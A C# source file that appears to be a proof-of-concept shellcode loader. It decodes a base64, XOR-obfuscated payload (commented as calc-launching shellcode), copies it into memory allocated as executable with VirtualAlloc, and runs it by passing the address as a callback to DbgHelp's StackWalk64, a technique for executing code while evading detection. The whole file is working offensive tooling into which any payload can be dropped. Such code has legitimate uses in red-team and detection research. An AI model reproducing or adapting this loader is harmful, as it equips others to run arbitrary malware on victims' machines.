using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace AltCallbacks
{
    class Callback
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct STACKFRAME64
        {
            public long AddrPC;
            public long AddrReturn;
            public long AddrFrame;
            public long AddrStack;
            public long AddrBStore;
            public M128A  M128A;
            public long AddrStackMax;
            public long AddrStackMin;
            public long AddrBStoreMax;
            public long AddrBStoreMin;
            public uint BuildVersion;
            public uint Flags;
            public uint AddrPCMax;
            public uint AddrReturnMax;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public long High;
            public long Low;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT_FLAGS
        {
            public uint Flags;
            public uint Fill;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        const uint MEM_COMMIT = 0x00001000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        const uint IMAGE_FILE_MACHINE_AMD64 = 0x8664;

        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("DbgHelp.dll")]
        public static extern bool StackWalk64(
            uint MachineType,
            IntPtr hProcess,
            IntPtr hThread,
            ref STACKFRAME64 StackFrame,
            ref CONTEXT64 ContextRecord,
            IntPtr ReadMemoryRoutine,
            IntPtr FunctionTableAccessRoutine,
            IntPtr GetModuleBaseRoutine,
            IntPtr TranslateAddress
        );

        static string key = "THISISMYKEY";

        static void Main(string[] args)
        {
            // Calc shellcode
            string base64 = @"qADKt7m7jVlLRRgFCRkBGAUFaJkgEd8aKRvCAVURwBd5HMM7AwFc+hMBCGidAHiT5W8sJUlpeRWJgF4IUoy7phcYBQDCAWnYD2UDRInfyMFTSVMF3IsxPhxJmQPCG1UdwAV5HUmZsB8bspAKzm3cAEiFBGKEEXqF9RWJgF4IUoxhqzCoGEsFd0EWdIg+nQEQwwl3AFKdPwrOVRwMwhNVGkyJCs5d3ABIgwgLDAEVHAMVEAgKCAkF2qdlGAa3qQsIChcRwFewA7e2rBQb91hLRVlUSElTAd7AWEpFWRXyeNgm1LKM8KVEfkII6e/G8MS0kBHXjGFvTy9H2bClLFHzDkA7PCdZEgTQjrecMCg/LncuPTxU";

            byte[] decoded = Convert.FromBase64String(base64);
            byte[] shellcode = new byte[decoded.Length];

            for (int i = 0; i < decoded.Length; i++)
                shellcode[i] = ((byte)(decoded[i] ^ key[(i % key.Length)]));

            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
            Marshal.Copy(shellcode, 0, p, shellcode.Length);

            IntPtr process =  Process.GetCurrentProcess().Handle;

            STACKFRAME64 sStackFrame = new STACKFRAME64();
            CONTEXT64 sContext = new CONTEXT64();

            // Callback function
            StackWalk64(
                IMAGE_FILE_MACHINE_AMD64,
                process,            // Current process
                IntPtr.Zero,
                ref sStackFrame,    // A pointer to a STACKFRAME64 structure
                ref sContext,       // A pointer to a CONTEXT64 struct
                IntPtr.Zero,
                p,                  // Callback
                IntPtr.Zero, 
                IntPtr.Zero
            );

            return;
        }
    }
}
